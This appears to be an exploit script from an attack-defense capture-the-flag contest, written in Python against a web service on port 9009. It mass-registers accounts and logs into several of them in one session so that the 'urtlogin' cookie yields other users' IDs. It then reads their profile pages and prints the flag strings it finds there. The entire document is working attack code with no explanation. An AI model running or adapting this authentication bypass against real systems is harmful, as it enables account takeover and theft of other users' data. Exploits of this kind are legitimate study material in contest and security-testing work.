#!/usr/bin/env python3

import json
import os
import sqlite3
import sys
import re
import requests

FLAG_RE = re.compile("[A-Z0-9]{31}=")

ip = sys.argv[1]

create_tables = not os.path.exists("/tmp/estates-users.db")
db = sqlite3.connect("/tmp/estates-users.db")

if create_tables:
    db.cursor().execute("CREATE TABLE urt_services (ip TEXT, accounts TEXT, max_user_id INTEGER)")
    db.commit()

def register(ip, username, password):
    with requests.Session() as s:
        s.post(f"http://{ip}:9009/register", data={"username": username, "password": password})
        s.post(f"http://{ip}:9009/login", data={"username": username, "password": password})
        return int(s.cookies["urtlogin"].replace('"', "").split(" ")[0])

service_data = db.cursor().execute("SELECT accounts, max_user_id FROM urt_services WHERE ip=?", (ip, )).fetchall()
if not service_data:
    accounts = {}

    min_user_id = register(ip, "default", "some!!!")
    accounts[min_user_id] = ["default", "some!!!"]

    for i in range(min_user_id + 1, min_user_id * 2 + 1):
        user_id = register(ip, f"{i}", "some!!!")
        accounts[user_id] = [f"{i}", "some!!!"]

    max_user_id = max(accounts.keys())
    db.cursor().execute("INSERT INTO urt_services (ip, accounts, max_user_id) VALUES (?, ?, ?)",
                        (ip, json.dumps(accounts), max_user_id))
    db.commit()
else:
    accounts, max_user_id = {int(k): v for k, v in json.loads(service_data[0][0]).items()}, service_data[0][1]
    min_user_id = min(accounts.keys())


for user_id in range(max_user_id + 1, 99999999999999999999):
    decomposition = [user_id % min_user_id + min_user_id * (2 if user_id % min_user_id == 0 else 1)]
    decomposition += [min_user_id] * ((user_id - 1) // min_user_id - 1)
    with requests.Session() as s:
        for u in decomposition:
            try:
                s.post(f"http://{ip}:9009/login", data={"username": accounts[u][0], "password": accounts[u][1]})
            except KeyError:
                continue

        actual_user_id = int(s.cookies["urtlogin"].replace('"', "").split(" ")[0])
        text = s.get(f"http://{ip}:9009/user/{actual_user_id}").text

        if "ОШИБКА" in text:  # user not found, apparently not registered yet
            break

        for flag in FLAG_RE.findall(text):
            print(flag, flush=True)

        db.cursor().execute("UPDATE urt_services SET max_user_id=? WHERE ip=?", (user_id, ip))
        db.commit()
